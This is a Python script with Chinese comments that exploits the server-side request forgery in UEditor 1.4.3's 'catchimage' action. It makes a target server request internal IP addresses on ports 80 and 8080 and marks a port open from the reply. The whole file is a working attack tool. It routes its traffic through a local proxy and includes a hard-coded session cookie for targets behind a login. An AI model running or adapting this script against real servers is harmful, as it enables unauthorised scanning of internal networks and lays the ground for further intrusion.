import sys
import json
import requests
from IPy import IP


"""
python version 3.7
requerments: IPy==1.0
UEditor1.4.3
"""

def check(url,ip,port,headers=""):
	# 不同的系统，action参数在url中的路径不一样，所以要根据目标系统修改
	#url = '%s/jsp/controller.jsp?action=catchimage&source[]=http://%s:%s/tomcat.png'%(url,ip,port)
	url1 = '%s/ueditor/dispatch?action=catchimage&source[]=http://%s:%s/tomcat.png'%(url,ip,port)
	proxies = {
		'http':'127.0.0.1:8888',
		'https':'127.0.0.1:8888'
	}
	res = requests.get(url1,headers=headers,proxies=proxies)	# 本地开启代理，可以查看都请求了什么
	# res = requests.get(url1,headers=headers,proxies=proxies)
	r = res.text
	if r:
		r = r.replace("list","\"list\"")
		res_json = json.loads(r)
		state = res_json['list'][0]['state']
		if state == '远程连接出错' or state == 'SUCCESS':
			print(ip,"--",port,"--"," is Open")

def main(url,ip,headers=""):
	ips = IP(ip)
	# ports可以自定义多个想要探测的内容端口
	ports = [80,8080]
	for i in ips:
		for port in ports:
			check(url,i,port,headers=headers)


if __name__ == '__main__':
	url = sys.argv[1]
	ip = sys.argv[2]
	# 如果需要登录的目标系统，需要添加cookie
	headers={
    'Cookie':'JSESSIONID=975E4122EFD3EA7F166A40E6628BBC62.s1'
	}
	main(url,ip,headers=headers)
